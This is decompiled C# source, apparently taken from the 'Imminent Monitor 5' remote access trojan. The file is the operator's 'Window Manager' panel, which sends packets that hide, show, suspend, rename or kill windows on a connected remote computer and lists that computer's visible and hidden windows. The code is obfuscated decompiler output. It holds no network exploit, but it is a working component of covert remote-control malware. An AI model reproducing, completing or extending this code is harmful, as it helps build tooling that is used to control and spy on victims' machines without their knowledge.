// Decompiled with JetBrains decompiler
// Type: UserControlWindowManager
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlWindowManager : UserControl
{
  private IContainer icontainer_0;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ToolStripMenuItem toolStripMenuItem_2;
  private ToolStripMenuItem toolStripMenuItem_3;
  private ToolStripMenuItem toolStripMenuItem_4;
  private ToolStripMenuItem toolStripMenuItem_5;
  private ToolStripMenuItem toolStripMenuItem_6;
  private ToolStripMenuItem toolStripMenuItem_7;
  private ToolStripMenuItem toolStripMenuItem_8;
  private ImageList imageList_0;
  private GClass18 gclass18_0;

  public UserControlWindowManager()
  {
    this.Load += new EventHandler(this.UserControlWindowManager_Load);
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (UserControlWindowManager));
    this.vmethod_1(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_3(new ToolStripMenuItem());
    this.vmethod_5(new ToolStripSeparator());
    this.vmethod_7(new ToolStripMenuItem());
    this.vmethod_9(new ToolStripMenuItem());
    this.vmethod_11(new ToolStripMenuItem());
    this.vmethod_13(new ToolStripMenuItem());
    this.vmethod_15(new ToolStripMenuItem());
    this.vmethod_17(new ToolStripMenuItem());
    this.vmethod_19(new ToolStripMenuItem());
    this.vmethod_21(new ToolStripMenuItem());
    this.vmethod_23(new ImageList(this.icontainer_0));
    this.vmethod_0().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_0().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_0().Items.AddRange(new ToolStripItem[10]
    {
      (ToolStripItem) this.vmethod_2(),
      (ToolStripItem) this.vmethod_4(),
      (ToolStripItem) this.vmethod_6(),
      (ToolStripItem) this.vmethod_8(),
      (ToolStripItem) this.vmethod_10(),
      (ToolStripItem) this.vmethod_12(),
      (ToolStripItem) this.vmethod_14(),
      (ToolStripItem) this.vmethod_16(),
      (ToolStripItem) this.vmethod_18(),
      (ToolStripItem) this.vmethod_20()
    });
    this.vmethod_0().Name = "cntWindow";
    ContextMenuStrip contextMenuStrip = this.vmethod_0();
    Size size1 = new Size(195, 208);
    Size size2 = size1;
    contextMenuStrip.Size = size2;
    this.vmethod_2().Name = "RefreshWindowToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_2();
    size1 = new Size(194, 22);
    Size size3 = size1;
    toolStripMenuItem1.Size = size3;
    this.vmethod_2().Tag = (object) "0";
    this.vmethod_2().Text = "Refresh";
    this.vmethod_4().Name = "ToolStripSeparator1";
    ToolStripSeparator toolStripSeparator = this.vmethod_4();
    size1 = new Size(191, 6);
    Size size4 = size1;
    toolStripSeparator.Size = size4;
    this.vmethod_4().Tag = (object) "SEPERATOR";
    this.vmethod_6().Name = "ChangeWindowTextToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_6();
    size1 = new Size(194, 22);
    Size size5 = size1;
    toolStripMenuItem2.Size = size5;
    this.vmethod_6().Tag = (object) "0";
    this.vmethod_6().Text = "Change Window Text";
    this.vmethod_8().Name = "SuspendToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem3 = this.vmethod_8();
    size1 = new Size(194, 22);
    Size size6 = size1;
    toolStripMenuItem3.Size = size6;
    this.vmethod_8().Tag = (object) "0";
    this.vmethod_8().Text = "Suspend";
    this.vmethod_10().Name = "ResumeToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem4 = this.vmethod_10();
    size1 = new Size(194, 22);
    Size size7 = size1;
    toolStripMenuItem4.Size = size7;
    this.vmethod_10().Tag = (object) "0";
    this.vmethod_10().Text = "Resume";
    this.vmethod_12().Name = "HideToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem5 = this.vmethod_12();
    size1 = new Size(194, 22);
    Size size8 = size1;
    toolStripMenuItem5.Size = size8;
    this.vmethod_12().Tag = (object) "0";
    this.vmethod_12().Text = "Hide";
    this.vmethod_14().Name = "ShowToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem6 = this.vmethod_14();
    size1 = new Size(194, 22);
    Size size9 = size1;
    toolStripMenuItem6.Size = size9;
    this.vmethod_14().Tag = (object) "0";
    this.vmethod_14().Text = "Show";
    this.vmethod_16().Name = "MinimizeToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem7 = this.vmethod_16();
    size1 = new Size(194, 22);
    Size size10 = size1;
    toolStripMenuItem7.Size = size10;
    this.vmethod_16().Tag = (object) "0";
    this.vmethod_16().Text = "Minimize";
    this.vmethod_18().Name = "RestoreToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem8 = this.vmethod_18();
    size1 = new Size(194, 22);
    Size size11 = size1;
    toolStripMenuItem8.Size = size11;
    this.vmethod_18().Tag = (object) "0";
    this.vmethod_18().Text = "Restore";
    this.vmethod_20().Name = "CloseToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem9 = this.vmethod_20();
    size1 = new Size(194, 22);
    Size size12 = size1;
    toolStripMenuItem9.Size = size12;
    this.vmethod_20().Tag = (object) "0";
    this.vmethod_20().Text = "Kill";
    this.vmethod_22().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListWindow.ImageStream");
    this.vmethod_22().TransparentColor = Color.Transparent;
    this.vmethod_22().Images.SetKeyName(0, "1389765181_window_application.png");
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlWindowManager);
    size1 = new Size(736, 483);
    this.Size = size1;
    this.vmethod_0().ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual ContextMenuStrip vmethod_0() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_2() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_0 = toolStripMenuItem_9;

  internal virtual ToolStripSeparator vmethod_4() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(ToolStripSeparator toolStripSeparator_1) => this.toolStripSeparator_0 = toolStripSeparator_1;

  internal virtual ToolStripMenuItem vmethod_6() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_1 = toolStripMenuItem_9;

  internal virtual ToolStripMenuItem vmethod_8() => this.toolStripMenuItem_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_2 = toolStripMenuItem_9;

  internal virtual ToolStripMenuItem vmethod_10() => this.toolStripMenuItem_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_3 = toolStripMenuItem_9;

  internal virtual ToolStripMenuItem vmethod_12() => this.toolStripMenuItem_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_4 = toolStripMenuItem_9;

  internal virtual ToolStripMenuItem vmethod_14() => this.toolStripMenuItem_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_5 = toolStripMenuItem_9;

  internal virtual ToolStripMenuItem vmethod_16() => this.toolStripMenuItem_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_6 = toolStripMenuItem_9;

  internal virtual ToolStripMenuItem vmethod_18() => this.toolStripMenuItem_7;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_7 = toolStripMenuItem_9;

  internal virtual ToolStripMenuItem vmethod_20() => this.toolStripMenuItem_8;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(ToolStripMenuItem toolStripMenuItem_9) => this.toolStripMenuItem_8 = toolStripMenuItem_9;

  internal virtual ImageList vmethod_22() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(ImageList imageList_1) => this.imageList_0 = imageList_1;

  public GClass18 method_0() => this.gclass18_0;

  public void method_1(GClass18 gclass18_1) => this.gclass18_0 = gclass18_1;

  public void method_2()
  {
    this.Invoke((Delegate) (() => Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), "showOverlay()")));
    object[] object_0 = new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Refresh
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_3(int int_0, string string_0)
  {
    UserControlWindowManager.Class104 class104 = new UserControlWindowManager.Class104();
    class104.string_1 = string_0;
    class104.string_0 = string.Empty;
    this.Invoke((Delegate) new Delegate0(class104._Lambda\u0024__79));
    if (class104.string_0 == null)
      return;
    object[] object_0 = new object[4]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Caption,
      (object) int_0,
      (object) class104.string_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_4(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Suspend,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_5(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.ResumeWindow,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_6(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Hide,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_7(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Show,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_8(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Minimize,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_9(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Restore,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_10(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Window,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Close,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_11(object[] object_0)
  {
    string str1 = "wmAddRows('visibleTable', [";
    string str2 = "wmAddRows('hiddenTable', [";
    int num = object_0.Length - 1;
    for (int index = 2; index <= num; index += 3)
    {
      string str3 = Class97.smethod_21((string) object_0[index + 2]).Replace("&#0;", string.Empty);
      string Left = Class97.smethod_21(this.method_19((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket) Conversions.ToByte(object_0[index])));
      string str4 = Class97.smethod_21((string) object_0[index + 1]);
      string str5 = string.Format("{{caption:'{0}',visible:'{1}',handle:'{2}'}},", (object) str3.Replace("\\", "\\\\"), (object) Left, (object) str4);
      if (Operators.CompareString(Left, "Yes", false) == 0)
        str1 += str5;
      else
        str2 += str5;
    }
    string string_4_1 = str1.TrimEnd(',') + "])";
    string string_4_2 = str2.TrimEnd(',') + "])";
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_1);
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_2);
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), "hideOverlay()");
  }

  public void method_12(object[] object_0)
  {
  }

  public void method_13(object[] object_0) => this.method_18(Conversions.ToInteger(object_0[4]), Color.LightGray);

  public void method_14(object[] object_0) => this.method_18(Conversions.ToInteger(object_0[4]), Color.FromArgb((int) byte.MaxValue, 117, 117, 117));

  public void method_15(object[] object_0)
  {
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "visibleTable.removeRowByUniqueID(visibleTable.findRowByText({handle:'", object_0[4]), (object) "'}))")));
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "hiddenTable.removeRowByUniqueID(hiddenTable.findRowByText({handle:'", object_0[4]), (object) "'}))")));
  }

  public void method_16(object[] object_0) => this.method_18(Conversions.ToInteger(object_0[4]), Color.DarkOrange);

  public void method_17(object[] object_0) => this.method_18(Conversions.ToInteger(object_0[4]), Color.FromArgb((int) byte.MaxValue, 117, 117, 117));

  private void method_18(int int_0, Color color_0)
  {
    Color color = color_0;
    string string_4_1 = "wmChangeRowColor('visibleTable', visibleTable.findRowByText({handle:'" + Conversions.ToString(int_0) + "'}, undefined, true), 'rgba(" + Conversions.ToString(color.R) + ", " + Conversions.ToString(color.G) + ", " + Conversions.ToString(color.B) + ", 1.0)')";
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_1);
    string string_4_2 = "wmChangeRowColor('hiddenTable', hiddenTable.findRowByText({handle:'" + Conversions.ToString(int_0) + "'}, undefined, true), 'rgba(" + Conversions.ToString(color.R) + ", " + Conversions.ToString(color.G) + ", " + Conversions.ToString(color.B) + ", 1.0)')";
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_2);
  }

  private string method_19(
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket windowPacket_0)
  {
    switch (windowPacket_0)
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Visible:
        return "Yes";
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WindowPacket.Invisible:
        return "No";
      default:
        return "No";
    }
  }

  private void UserControlWindowManager_Load(object sender, EventArgs e)
  {
    if (this.DesignMode)
      return;
    Class97.smethod_15(this.vmethod_0());
    Class97.smethod_7(this.vmethod_0());
  }

  internal sealed class Class104
  {
    public string string_0;
    public string string_1;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__79() => this.string_0 = Interaction.InputBox("Enter a new title for window: " + this.string_1, "Imminent Monitor", string.Empty);
  }
}
